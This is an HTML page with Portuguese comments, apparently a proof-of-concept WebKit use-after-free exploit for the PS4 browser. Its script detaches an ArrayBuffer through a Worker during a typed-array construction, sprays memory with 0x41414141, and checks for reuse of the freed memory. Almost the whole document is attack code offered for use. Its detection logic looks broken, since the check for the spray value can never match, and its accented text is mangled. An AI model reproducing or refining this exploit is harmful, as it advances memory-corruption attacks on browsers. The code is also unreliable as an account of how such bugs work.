<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 Worker UAF (Stable)</title>
    
</head>
<body>
    <h2>WEBKIT UAF STABILIZED</h2>
    <p>Estrat√©gia: UAF via Worker + Integer Spray (Evita Crash Imediato)</p>
    
    <button id="btnRun" onclick="startStableExploit()">INICIAR EXPLOIT (Tentar Leitura)</button>
    <div id="console">Pronto. Clique para iniciar...</div>

    <script>
        const logDiv = document.getElementById('console');
        function log(msg, type = '') {
            logDiv.innerHTML += `<div class="${type}">[${new Date().toLocaleTimeString().split(' ')[0]}] ${msg}</div>`;
            logDiv.scrollTop = logDiv.scrollHeight;
        }

        // Configura√ß√£o
        const UAF_SIZE = 0x800; // 2KB (Menor = Mais est√°vel para alinhamento)
        const SPRAY_PATTERN = 0x41414141; // 'AAAA' em Hex
        var worker = null;

        // C√≥digo do Worker
        // Simplesmente recebe o buffer para causar o 'Detach'
        const workerCode = `
            onmessage = function(e) {
                const ab = e.data;
                // Mant√©m o buffer vivo por um milissegundo para garantir a transfer√™ncia
                setTimeout(() => { postMessage("PONG"); }, 1);
            };
        `;

        async function startStableExploit() {
            document.getElementById('btnRun').disabled = true;
            log("Inicializando Worker...");
            
            if (worker) worker.terminate();
            const blob = new Blob([workerCode], {type: 'application/javascript'});
            worker = new Worker(URL.createObjectURL(blob));

            log("Iniciando Race Loop (20 tentativas)...");

            for (let attempt = 1; attempt <= 20; attempt++) {
                // Feedback visual sem floodar
                if(attempt % 5 === 0) log(`Tentativa ${attempt}/20...`);

                let result = await runRaceIteration();
                
                if (result) {
                    log(`üõë UAF SUCESSO! Mem√≥ria Reutilizada!`, 'vuln');
                    log(`Valor Lido: 0x${result.toString(16)}`, 'vuln');
                    log("Isso prova que controlamos o ponteiro sem crashar.", 'success');
                    return; // Para tudo
                }

                // Pequena pausa para estabilizar o GC
                await new Promise(r => setTimeout(r, 100));
            }

            log("Falha. O buffer foi protegido ou o Race n√£o alinhou.");
            document.getElementById('btnRun').disabled = false;
        }

        function runRaceIteration() {
            return new Promise((resolve) => {
                try {
                    // 1. Buffer V√≠tima (Source)
                    let srcBuffer = new ArrayBuffer(UAF_SIZE);
                    let srcView = new DataView(srcBuffer);
                    // Preenche com 0xBBBBBBBB para diferenciar do nosso spray (0xAAAA...)
                    for(let i=0; i < UAF_SIZE; i+=4) srcView.setUint32(i, 0xBBBBBBBB, true);

                    // 2. O Iterador Sabotador
                    let iter = {
                        [Symbol.iterator]() {
                            let i = 0;
                            return {
                                next() {
                                    i++;
                                    
                                    // GATILHO: Aos 25% da c√≥pia, transferimos o buffer
                                    // Ajuste este valor se continuar falhando (ex: UAF_SIZE / 2)
                                    if (i === (UAF_SIZE / 4)) { 
                                        worker.postMessage(srcBuffer, [srcBuffer]);
                                        
                                        // SPRAY DE INTEIROS (Seguro)
                                        // Tentamos ocupar o lugar do buffer morto com n√∫meros 0x41414141
                                        // Isso n√£o crasha se o navegador tentar ler como ponteiro ou int.
                                        let spray = new Uint32Array(UAF_SIZE / 4);
                                        spray.fill(SPRAY_PATTERN);
                                    }
                                    
                                    // Se o buffer for desligado, retornamos um marcador de erro
                                    if (srcBuffer.byteLength === 0) {
                                        return { value: 0xDEADDEAD, done: false };
                                    }
                                    
                                    return { value: 0, done: i >= (UAF_SIZE / 2) };
                                }
                            };
                        }
                    };

                    // 3. Execu√ß√£o (TypedArray Constructor)
                    // O navegador come√ßa a criar o array consumindo 'iter'
                    let res = new Uint32Array(iter);

                    // 4. Verifica√ß√£o P√≥s-Execu√ß√£o
                    for(let k=0; k < res.length; k++) {
                        let val = res[k];
                        
                        // Se lermos 0x41414141 (nosso spray) onde deveria haver 0xBBBB... ou 0
                        // Significa que lemos a mem√≥ria que n√≥s mesmos injetamos!
                        if (val === SPRAY_PATTERN) {
                            resolve(val);
                            return;
                        }
                    }

                } catch (e) {
                    // Ignora erros de "Detached Buffer" pois s√£o esperados
                }
                resolve(null);
            });
        }
    </script>
</body>
</html>
